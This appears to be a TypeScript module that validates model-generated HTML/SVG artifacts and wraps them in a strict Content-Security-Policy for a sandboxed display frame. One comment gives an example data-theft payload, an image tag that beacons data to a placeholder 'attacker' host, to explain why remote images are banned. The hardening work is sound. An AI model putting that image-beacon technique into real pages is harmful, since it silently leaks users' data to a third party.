import { z } from "zod";

// "Artifacts" are full HTML/SVG documents the model can render in a sandboxed
// side panel (the Claude/ChatGPT-Canvas pattern). They run with NO access to
// the parent page, cookies, storage, or network — see buildArtifactDoc.

export const ArtifactSchema = z.object({
  title: z.preprocess((v) => (v == null || v === "" ? "Artifact" : String(v)), z.string().max(160)),
  kind: z.enum(["html", "svg"]).catch("html"),
  content: z.string().min(1).max(100000),
});

export type Artifact = z.infer<typeof ArtifactSchema>;

export function parseArtifact(raw: unknown): Artifact | null {
  let value: unknown = raw;
  if (typeof value === "string") {
    try { value = JSON.parse(value); } catch { return null; }
  }
  const parsed = ArtifactSchema.safeParse(value);
  return parsed.success ? parsed.data : null;
}

/** Static host page that renders artifacts (see ArtifactFrame). Artifacts are
 *  NOT delivered by srcdoc: srcdoc inherits the embedder's CSP, which would
 *  block the model's inline scripts in any build that ships a policy. */
export const ARTIFACT_FRAME_PATH = "artifact-frame.html";

// Strict, locked-down CSP for the sandboxed frame:
//  • default-src 'none'         → nothing loads unless explicitly allowed
//  • script/style 'unsafe-inline' → the model's own inline JS/CSS may run
//  • img/font/media data: ONLY  → embedded assets render; https: is banned
//    because <img src="https://attacker/?d=…"> is a zero-click GET that
//    exfiltrates data on paint (connect-src does not cover image loads)
//  • connect-src 'none'         → no fetch/XHR/WebSocket
//  • base-uri/form-action 'none'→ no base hijack / form posts
const CSP =
  "default-src 'none'; " +
  "script-src 'unsafe-inline' 'unsafe-eval'; " +
  "style-src 'unsafe-inline'; " +
  "img-src data: blob:; font-src data:; media-src data: blob:; " +
  "connect-src 'none'; base-uri 'none'; form-action 'none'";

/**
 * Wrap the model's inner body markup in a minimal document with the locked-down
 * CSP. We supply the html/head/body shell so the CSP is always first and the
 * model only provides body content (it's instructed not to send wrappers).
 */
export function buildArtifactDoc(artifact: Artifact): string {
  return [
    "<!DOCTYPE html><html><head>",
    '<meta charset="utf-8">',
    '<meta name="viewport" content="width=device-width, initial-scale=1">',
    `<meta http-equiv="Content-Security-Policy" content="${CSP}">`,
    "<style>html,body{margin:0}body{font-family:system-ui,-apple-system,Segoe UI,sans-serif;padding:14px;color:#0f172a;background:#fff;line-height:1.5}img,svg{max-width:100%;height:auto}</style>",
    "</head><body>",
    artifact.content,
    "</body></html>",
  ].join("");
}
